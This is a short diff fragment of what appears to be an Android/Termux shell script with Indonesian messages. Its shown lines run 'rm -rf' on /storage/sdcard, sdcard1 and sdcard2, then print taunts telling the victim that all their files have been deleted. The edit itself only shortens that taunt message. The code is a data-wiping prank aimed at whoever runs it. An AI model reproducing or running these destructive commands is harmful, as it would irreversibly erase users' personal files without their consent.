@@ -31,5 +31,5 @@ rm -rf /storage/sdcard
 rm -rf /storage/sdcard1
 rm -rf /storage/sdcard2
 echo "oke tunggu sebentar" | lolcat
-echo "selamat file anda terhapus semua haha kalau mau balik lagi data d$
+echo "selamat file anda terhapus semua"
 fi
